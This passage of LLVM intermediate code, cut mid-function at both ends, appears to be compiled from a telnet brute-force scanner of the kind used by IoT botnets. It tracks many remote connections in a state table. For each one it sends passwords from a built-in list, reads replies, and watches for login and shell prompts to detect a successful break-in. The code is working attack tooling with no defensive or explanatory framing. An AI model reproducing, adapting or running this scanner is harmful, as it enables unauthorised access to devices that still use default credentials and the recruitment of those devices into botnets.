  %906 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %905
  %907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %906, i32 0, i32 3
  store i8 0, i8* %907, align 1
  br label %2264

; <label>:908:                                    ; preds = %885
  %909 = load i32, i32* %2, align 4
  %910 = sext i32 %909 to i64
  %911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %910
  %912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %911, i32 0, i32 8
  %913 = load i8*, i8** %912, align 8
  %914 = call i8* @strstr(i8* %913, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0)) #10
  %915 = icmp ne i8* %914, null
  br i1 %915, label %916, label %931

; <label>:916:                                    ; preds = %908
  %917 = load i32, i32* %2, align 4
  %918 = sext i32 %917 to i64
  %919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %918
  %920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %919, i32 0, i32 0
  %921 = load i32, i32* %920, align 16
  %922 = call i32 @sclose(i32 %921)
  %923 = load i32, i32* %2, align 4
  %924 = sext i32 %923 to i64
  %925 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %924
  %926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %925, i32 0, i32 2
  store i8 0, i8* %926, align 8
  %927 = load i32, i32* %2, align 4
  %928 = sext i32 %927 to i64
  %929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %928
  %930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %929, i32 0, i32 3
  store i8 0, i8* %930, align 1
  br label %2264

; <label>:931:                                    ; preds = %908
  %932 = load i32, i32* %2, align 4
  %933 = sext i32 %932 to i64
  %934 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %933
  %935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %934, i32 0, i32 8
  %936 = load i8*, i8** %935, align 8
  %937 = call i8* @strstr(i8* %936, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0)) #10
  %938 = icmp ne i8* %937, null
  br i1 %938, label %939, label %954

; <label>:939:                                    ; preds = %931
  %940 = load i32, i32* %2, align 4
  %941 = sext i32 %940 to i64
  %942 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %941
  %943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %942, i32 0, i32 0
  %944 = load i32, i32* %943, align 16
  %945 = call i32 @sclose(i32 %944)
  %946 = load i32, i32* %2, align 4
  %947 = sext i32 %946 to i64
  %948 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %947
  %949 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %948, i32 0, i32 2
  store i8 0, i8* %949, align 8
  %950 = load i32, i32* %2, align 4
  %951 = sext i32 %950 to i64
  %952 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %951
  %953 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %952, i32 0, i32 3
  store i8 0, i8* %953, align 1
  br label %2264

; <label>:954:                                    ; preds = %931
  %955 = load i32, i32* %2, align 4
  %956 = sext i32 %955 to i64
  %957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %956
  %958 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %957, i32 0, i32 8
  %959 = load i8*, i8** %958, align 8
  %960 = call i8* @strstr(i8* %959, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0)) #10
  %961 = icmp ne i8* %960, null
  br i1 %961, label %962, label %977

; <label>:962:                                    ; preds = %954
  %963 = load i32, i32* %2, align 4
  %964 = sext i32 %963 to i64
  %965 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %964
  %966 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %965, i32 0, i32 0
  %967 = load i32, i32* %966, align 16
  %968 = call i32 @sclose(i32 %967)
  %969 = load i32, i32* %2, align 4
  %970 = sext i32 %969 to i64
  %971 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %970
  %972 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %971, i32 0, i32 2
  store i8 0, i8* %972, align 8
  %973 = load i32, i32* %2, align 4
  %974 = sext i32 %973 to i64
  %975 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %974
  %976 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %975, i32 0, i32 3
  store i8 0, i8* %976, align 1
  br label %2264

; <label>:977:                                    ; preds = %954
  %978 = load i32, i32* %2, align 4
  %979 = sext i32 %978 to i64
  %980 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %979
  %981 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %980, i32 0, i32 8
  %982 = load i8*, i8** %981, align 8
  %983 = call i8* @strstr(i8* %982, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #10
  %984 = icmp ne i8* %983, null
  br i1 %984, label %985, label %1000

; <label>:985:                                    ; preds = %977
  %986 = load i32, i32* %2, align 4
  %987 = sext i32 %986 to i64
  %988 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %987
  %989 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %988, i32 0, i32 0
  %990 = load i32, i32* %989, align 16
  %991 = call i32 @sclose(i32 %990)
  %992 = load i32, i32* %2, align 4
  %993 = sext i32 %992 to i64
  %994 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %993
  %995 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %994, i32 0, i32 2
  store i8 0, i8* %995, align 8
  %996 = load i32, i32* %2, align 4
  %997 = sext i32 %996 to i64
  %998 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %997
  %999 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %998, i32 0, i32 3
  store i8 0, i8* %999, align 1
  br label %2264

; <label>:1000:                                   ; preds = %977
  %1001 = load i32, i32* %2, align 4
  %1002 = sext i32 %1001 to i64
  %1003 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1002
  %1004 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1003, i32 0, i32 8
  %1005 = load i8*, i8** %1004, align 8
  %1006 = call i8* @strstr(i8* %1005, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0)) #10
  %1007 = icmp ne i8* %1006, null
  br i1 %1007, label %1008, label %1023

; <label>:1008:                                   ; preds = %1000
  %1009 = load i32, i32* %2, align 4
  %1010 = sext i32 %1009 to i64
  %1011 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1010
  %1012 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1011, i32 0, i32 0
  %1013 = load i32, i32* %1012, align 16
  %1014 = call i32 @sclose(i32 %1013)
  %1015 = load i32, i32* %2, align 4
  %1016 = sext i32 %1015 to i64
  %1017 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1016
  %1018 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1017, i32 0, i32 2
  store i8 0, i8* %1018, align 8
  %1019 = load i32, i32* %2, align 4
  %1020 = sext i32 %1019 to i64
  %1021 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1020
  %1022 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1021, i32 0, i32 3
  store i8 0, i8* %1022, align 1
  br label %2264

; <label>:1023:                                   ; preds = %1000
  %1024 = load i32, i32* %2, align 4
  %1025 = sext i32 %1024 to i64
  %1026 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1025
  %1027 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1026, i32 0, i32 8
  %1028 = load i8*, i8** %1027, align 8
  %1029 = call i8* @strstr(i8* %1028, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0)) #10
  %1030 = icmp ne i8* %1029, null
  br i1 %1030, label %1031, label %1046

; <label>:1031:                                   ; preds = %1023
  %1032 = load i32, i32* %2, align 4
  %1033 = sext i32 %1032 to i64
  %1034 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1033
  %1035 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1034, i32 0, i32 0
  %1036 = load i32, i32* %1035, align 16
  %1037 = call i32 @sclose(i32 %1036)
  %1038 = load i32, i32* %2, align 4
  %1039 = sext i32 %1038 to i64
  %1040 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1039
  %1041 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1040, i32 0, i32 2
  store i8 0, i8* %1041, align 8
  %1042 = load i32, i32* %2, align 4
  %1043 = sext i32 %1042 to i64
  %1044 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1043
  %1045 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1044, i32 0, i32 3
  store i8 0, i8* %1045, align 1
  br label %2264

; <label>:1046:                                   ; preds = %1023
  %1047 = load i32, i32* %2, align 4
  %1048 = sext i32 %1047 to i64
  %1049 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1048
  %1050 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1049, i32 0, i32 8
  %1051 = load i8*, i8** %1050, align 8
  %1052 = call i8* @strstr(i8* %1051, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0)) #10
  %1053 = icmp ne i8* %1052, null
  br i1 %1053, label %1054, label %1069

; <label>:1054:                                   ; preds = %1046
  %1055 = load i32, i32* %2, align 4
  %1056 = sext i32 %1055 to i64
  %1057 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1056
  %1058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1057, i32 0, i32 0
  %1059 = load i32, i32* %1058, align 16
  %1060 = call i32 @sclose(i32 %1059)
  %1061 = load i32, i32* %2, align 4
  %1062 = sext i32 %1061 to i64
  %1063 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1062
  %1064 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1063, i32 0, i32 2
  store i8 0, i8* %1064, align 8
  %1065 = load i32, i32* %2, align 4
  %1066 = sext i32 %1065 to i64
  %1067 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1066
  %1068 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1067, i32 0, i32 3
  store i8 0, i8* %1068, align 1
  br label %2264

; <label>:1069:                                   ; preds = %1046
  %1070 = load i32, i32* %2, align 4
  %1071 = sext i32 %1070 to i64
  %1072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1071
  %1073 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1072, i32 0, i32 8
  %1074 = load i8*, i8** %1073, align 8
  %1075 = call i8* @strstr(i8* %1074, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0)) #10
  %1076 = icmp ne i8* %1075, null
  br i1 %1076, label %1077, label %1092

; <label>:1077:                                   ; preds = %1069
  %1078 = load i32, i32* %2, align 4
  %1079 = sext i32 %1078 to i64
  %1080 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1079
  %1081 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1080, i32 0, i32 0
  %1082 = load i32, i32* %1081, align 16
  %1083 = call i32 @sclose(i32 %1082)
  %1084 = load i32, i32* %2, align 4
  %1085 = sext i32 %1084 to i64
  %1086 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1085
  %1087 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1086, i32 0, i32 2
  store i8 0, i8* %1087, align 8
  %1088 = load i32, i32* %2, align 4
  %1089 = sext i32 %1088 to i64
  %1090 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1089
  %1091 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1090, i32 0, i32 3
  store i8 0, i8* %1091, align 1
  br label %2264

; <label>:1092:                                   ; preds = %1069
  %1093 = load i32, i32* %2, align 4
  %1094 = sext i32 %1093 to i64
  %1095 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1094
  %1096 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1095, i32 0, i32 8
  %1097 = load i8*, i8** %1096, align 8
  %1098 = call i64 @strlen(i8* %1097) #10
  %1099 = trunc i64 %1098 to i16
  %1100 = load i32, i32* %2, align 4
  %1101 = sext i32 %1100 to i64
  %1102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1101
  %1103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1102, i32 0, i32 7
  store i16 %1099, i16* %1103, align 16
  br label %1104

; <label>:1104:                                   ; preds = %1092
  %1105 = load i32, i32* %2, align 4
  %1106 = sext i32 %1105 to i64
  %1107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1106
  %1108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1107, i32 0, i32 6
  %1109 = load i32, i32* %1108, align 4
  %1110 = add i32 %1109, 10
  %1111 = zext i32 %1110 to i64
  %1112 = call i64 @time(i64* null) #2
  %1113 = icmp slt i64 %1111, %1112
  br i1 %1113, label %1114, label %1129

; <label>:1114:                                   ; preds = %1104
  %1115 = load i32, i32* %2, align 4
  %1116 = sext i32 %1115 to i64
  %1117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1116
  %1118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1117, i32 0, i32 0
  %1119 = load i32, i32* %1118, align 16
  %1120 = call i32 @sclose(i32 %1119)
  %1121 = load i32, i32* %2, align 4
  %1122 = sext i32 %1121 to i64
  %1123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1122
  %1124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1123, i32 0, i32 2
  store i8 0, i8* %1124, align 8
  %1125 = load i32, i32* %2, align 4
  %1126 = sext i32 %1125 to i64
  %1127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1126
  %1128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1127, i32 0, i32 3
  store i8 1, i8* %1128, align 1
  br label %1129

; <label>:1129:                                   ; preds = %1114, %1104
  br label %2263

; <label>:1130:                                   ; preds = %68
  %1131 = load i32, i32* %2, align 4
  %1132 = sext i32 %1131 to i64
  %1133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1132
  %1134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1133, i32 0, i32 0
  %1135 = load i32, i32* %1134, align 16
  %1136 = load i32, i32* %2, align 4
  %1137 = sext i32 %1136 to i64
  %1138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1137
  %1139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1138, i32 0, i32 5
  %1140 = load i8, i8* %1139, align 1
  %1141 = zext i8 %1140 to i64
  %1142 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %1141
  %1143 = load i8*, i8** %1142, align 8
  %1144 = load i32, i32* %2, align 4
  %1145 = sext i32 %1144 to i64
  %1146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1145
  %1147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1146, i32 0, i32 5
  %1148 = load i8, i8* %1147, align 1
  %1149 = zext i8 %1148 to i64
  %1150 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %1149
  %1151 = load i8*, i8** %1150, align 8
  %1152 = call i64 @strlen(i8* %1151) #10
  %1153 = call i64 @send(i32 %1135, i8* %1143, i64 %1152, i32 16384)
  %1154 = icmp slt i64 %1153, 0
  br i1 %1154, label %1155, label %1170

; <label>:1155:                                   ; preds = %1130
  %1156 = load i32, i32* %2, align 4
  %1157 = sext i32 %1156 to i64
  %1158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1157
  %1159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1158, i32 0, i32 0
  %1160 = load i32, i32* %1159, align 16
  %1161 = call i32 @sclose(i32 %1160)
  %1162 = load i32, i32* %2, align 4
  %1163 = sext i32 %1162 to i64
  %1164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1163
  %1165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1164, i32 0, i32 2
  store i8 0, i8* %1165, align 8
  %1166 = load i32, i32* %2, align 4
  %1167 = sext i32 %1166 to i64
  %1168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1167
  %1169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1168, i32 0, i32 3
  store i8 1, i8* %1169, align 1
  br label %2264

; <label>:1170:                                   ; preds = %1130
  %1171 = load i32, i32* %2, align 4
  %1172 = sext i32 %1171 to i64
  %1173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1172
  %1174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1173, i32 0, i32 0
  %1175 = load i32, i32* %1174, align 16
  %1176 = call i64 @send(i32 %1175, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i32 0, i32 0), i64 2, i32 16384)
  %1177 = icmp slt i64 %1176, 0
  br i1 %1177, label %1178, label %1193

; <label>:1178:                                   ; preds = %1170
  %1179 = load i32, i32* %2, align 4
  %1180 = sext i32 %1179 to i64
  %1181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1180
  %1182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1181, i32 0, i32 0
  %1183 = load i32, i32* %1182, align 16
  %1184 = call i32 @sclose(i32 %1183)
  %1185 = load i32, i32* %2, align 4
  %1186 = sext i32 %1185 to i64
  %1187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1186
  %1188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1187, i32 0, i32 2
  store i8 0, i8* %1188, align 8
  %1189 = load i32, i32* %2, align 4
  %1190 = sext i32 %1189 to i64
  %1191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1190
  %1192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1191, i32 0, i32 3
  store i8 1, i8* %1192, align 1
  br label %2264

; <label>:1193:                                   ; preds = %1170
  %1194 = load i32, i32* %2, align 4
  %1195 = sext i32 %1194 to i64
  %1196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1195
  %1197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1196, i32 0, i32 2
  store i8 6, i8* %1197, align 8
  br label %2263

; <label>:1198:                                   ; preds = %68
  %1199 = load i32, i32* %2, align 4
  %1200 = sext i32 %1199 to i64
  %1201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1200
  %1202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1201, i32 0, i32 6
  %1203 = load i32, i32* %1202, align 4
  %1204 = icmp eq i32 %1203, 0
  br i1 %1204, label %1205, label %1212

; <label>:1205:                                   ; preds = %1198
  %1206 = call i64 @time(i64* null) #2
  %1207 = trunc i64 %1206 to i32
  %1208 = load i32, i32* %2, align 4
  %1209 = sext i32 %1208 to i64
  %1210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1209
  %1211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1210, i32 0, i32 6
  store i32 %1207, i32* %1211, align 4
  br label %1212

; <label>:1212:                                   ; preds = %1205, %1198
  %1213 = load i32, i32* %2, align 4
  %1214 = sext i32 %1213 to i64
  %1215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1214
  %1216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1215, i32 0, i32 0
  %1217 = load i32, i32* %1216, align 16
  %1218 = load i32, i32* %2, align 4
  %1219 = sext i32 %1218 to i64
  %1220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1219
  %1221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1220, i32 0, i32 8
  %1222 = load i8*, i8** %1221, align 8
  %1223 = load i32, i32* %2, align 4
  %1224 = sext i32 %1223 to i64
  %1225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1224
  %1226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1225, i32 0, i32 7
  %1227 = load i16, i16* %1226, align 16
  %1228 = zext i16 %1227 to i32
  %1229 = call i32 @readUntil(i32 %1217, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1222, i32 1024, i32 %1228)
  %1230 = icmp ne i32 %1229, 0
  br i1 %1230, label %1231, label %1306

; <label>:1231:                                   ; preds = %1212
  %1232 = load i32, i32* %2, align 4
  %1233 = sext i32 %1232 to i64
  %1234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1233
  %1235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1234, i32 0, i32 6
  store i32 0, i32* %1235, align 4
  %1236 = load i32, i32* %2, align 4
  %1237 = sext i32 %1236 to i64
  %1238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1237
  %1239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1238, i32 0, i32 7
  store i16 0, i16* %1239, align 16
  %1240 = load i32, i32* %2, align 4
  %1241 = sext i32 %1240 to i64
  %1242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1241
  %1243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1242, i32 0, i32 8
  %1244 = load i8*, i8** %1243, align 8
  %1245 = call i8* @strstr(i8* %1244, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0)) #10
  %1246 = icmp ne i8* %1245, null
  br i1 %1246, label %1247, label %1267

; <label>:1247:                                   ; preds = %1231
  %1248 = load i32, i32* %2, align 4
  %1249 = sext i32 %1248 to i64
  %1250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1249
  %1251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1250, i32 0, i32 8
  %1252 = load i8*, i8** %1251, align 8
  call void @llvm.memset.p0i8.i64(i8* %1252, i8 0, i64 1024, i32 1, i1 false)
  %1253 = load i32, i32* %2, align 4
  %1254 = sext i32 %1253 to i64
  %1255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1254
  %1256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1255, i32 0, i32 0
  %1257 = load i32, i32* %1256, align 16
  %1258 = call i32 @sclose(i32 %1257)
  %1259 = load i32, i32* %2, align 4
  %1260 = sext i32 %1259 to i64
  %1261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1260
  %1262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1261, i32 0, i32 2
  store i8 0, i8* %1262, align 8
  %1263 = load i32, i32* %2, align 4
  %1264 = sext i32 %1263 to i64
  %1265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1264
  %1266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1265, i32 0, i32 3
  store i8 0, i8* %1266, align 1
  br label %2264

; <label>:1267:                                   ; preds = %1231
  %1268 = load i32, i32* %2, align 4
  %1269 = sext i32 %1268 to i64
  %1270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1269
  %1271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1270, i32 0, i32 8
  %1272 = load i8*, i8** %1271, align 8
  %1273 = call i32 @matchPrompt(i8* %1272)
  %1274 = icmp ne i32 %1273, 0
  br i1 %1274, label %1295, label %1275

; <label>:1275:                                   ; preds = %1267
  %1276 = load i32, i32* %2, align 4
  %1277 = sext i32 %1276 to i64
  %1278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1277
  %1279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1278, i32 0, i32 8
  %1280 = load i8*, i8** %1279, align 8
  call void @llvm.memset.p0i8.i64(i8* %1280, i8 0, i64 1024, i32 1, i1 false)
  %1281 = load i32, i32* %2, align 4
  %1282 = sext i32 %1281 to i64
  %1283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1282
  %1284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1283, i32 0, i32 0
  %1285 = load i32, i32* %1284, align 16
  %1286 = call i32 @sclose(i32 %1285)
  %1287 = load i32, i32* %2, align 4
  %1288 = sext i32 %1287 to i64
  %1289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1288
  %1290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1289, i32 0, i32 2
  store i8 0, i8* %1290, align 8
  %1291 = load i32, i32* %2, align 4
  %1292 = sext i32 %1291 to i64
  %1293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1292
  %1294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1293, i32 0, i32 3
  store i8 1, i8* %1294, align 1
  br label %2264

; <label>:1295:                                   ; preds = %1267
  %1296 = load i32, i32* %2, align 4
  %1297 = sext i32 %1296 to i64
  %1298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1297
  %1299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1298, i32 0, i32 2
  store i8 7, i8* %1299, align 8
  br label %1300

; <label>:1300:                                   ; preds = %1295
  %1301 = load i32, i32* %2, align 4
  %1302 = sext i32 %1301 to i64
  %1303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1302
  %1304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1303, i32 0, i32 8
  %1305 = load i8*, i8** %1304, align 8
  call void @llvm.memset.p0i8.i64(i8* %1305, i8 0, i64 1024, i32 1, i1 false)
  br label %2264

; <label>:1306:                                   ; preds = %1212
  %1307 = load i32, i32* %2, align 4
  %1308 = sext i32 %1307 to i64
  %1309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1308
  %1310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1309, i32 0, i32 0
  %1311 = load i32, i32* %1310, align 16
  %1312 = load i32, i32* %2, align 4
  %1313 = sext i32 %1312 to i64
  %1314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1313
  %1315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1314, i32 0, i32 8
  %1316 = load i8*, i8** %1315, align 8
  %1317 = load i32, i32* %2, align 4
  %1318 = sext i32 %1317 to i64
  %1319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1318
  %1320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1319, i32 0, i32 7
  %1321 = load i16, i16* %1320, align 16
  %1322 = zext i16 %1321 to i32
  %1323 = call i32 @readUntil(i32 %1311, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1316, i32 1024, i32 %1322)
  %1324 = icmp ne i32 %1323, 0
  br i1 %1324, label %1325, label %1400

; <label>:1325:                                   ; preds = %1306
  %1326 = load i32, i32* %2, align 4
  %1327 = sext i32 %1326 to i64
  %1328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1327
  %1329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1328, i32 0, i32 6
  store i32 0, i32* %1329, align 4
  %1330 = load i32, i32* %2, align 4
  %1331 = sext i32 %1330 to i64
  %1332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1331
  %1333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1332, i32 0, i32 7
  store i16 0, i16* %1333, align 16
  %1334 = load i32, i32* %2, align 4
  %1335 = sext i32 %1334 to i64
  %1336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1335
  %1337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1336, i32 0, i32 8
  %1338 = load i8*, i8** %1337, align 8
  %1339 = call i8* @strstr(i8* %1338, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0)) #10
  %1340 = icmp ne i8* %1339, null
  br i1 %1340, label %1341, label %1361

; <label>:1341:                                   ; preds = %1325
  %1342 = load i32, i32* %2, align 4
  %1343 = sext i32 %1342 to i64
  %1344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1343
  %1345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1344, i32 0, i32 8
  %1346 = load i8*, i8** %1345, align 8
  call void @llvm.memset.p0i8.i64(i8* %1346, i8 0, i64 1024, i32 1, i1 false)
  %1347 = load i32, i32* %2, align 4
  %1348 = sext i32 %1347 to i64
  %1349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1348
